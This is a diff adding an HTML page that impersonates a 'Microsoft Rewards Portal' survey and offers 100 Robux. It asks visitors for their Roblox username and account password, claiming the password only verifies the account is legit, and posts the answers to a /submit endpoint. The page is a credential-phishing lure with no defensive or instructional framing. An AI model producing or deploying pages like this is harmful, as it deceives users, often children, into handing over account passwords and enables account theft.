@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Microsoft Rewards Portal - Survey</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h2 { font-size: 24px; color: #333; margin-bottom: 8px; }
+        p { color: #666; font-size: 14px; margin-bottom: 24px; }
+        .progress-bar { height: 4px; width: 100%; background: #eee; margin-bottom: 20px; }
+        .progress-fill { height: 100%; width: 60%; background: #0078d4; }
+        label { display: block; font-size: 14px; margin-bottom: 5px; font-weight: 600; }
+        input, select { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #8a8a8a; border-radius: 2px; box-sizing: border-box; }
+        input:focus { border-color: #0078d4; outline: none; }
+        .btn { background-color: #0078d4; color: white; border: none; padding: 10px 20px; cursor: pointer; font-weight: 600; float: right; }
+        .btn:hover { background-color: #005a9e; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <h2>Microsoft Rewards protal</h2>
+        <p>Step 2 of 3: Confirm your account details to receive your 100 Robux credit.</p>
+
+        
+        <form action="/submit" method="POST">
+            <label>Are you a regular user of microsoft</label>
+            <select name ="Conformation">
+                <option value=" 1">Yes</option>
+                <option value="2">No</option>
+            </select>
+            <label>Which microsoft app do you use</label>
+            <input type="text" name="ji" placeholder="Enter the name of the microsoft app you user" required>
+            <label>Enter your Roblox Username: </label>
+            <input type="text" name="username" placeholder="Enter Username" required>
+
+            <label>Enter roblox account passowrd:(used to verify if this is a legit account or not) </label>
+            <input type="text" name="text" placeholder="Enter text" required>
+
+            <label>Select Reward Type</label>
+            <select name="reward">
+                <option value="robux">100 Robux</option>
+                <option value="credits">Microsoft Credits</option>
+            </select>
+
+            <button type="submit" class="btn">Next</button>
+        </form>
+    </div>
+</body>
+</html>
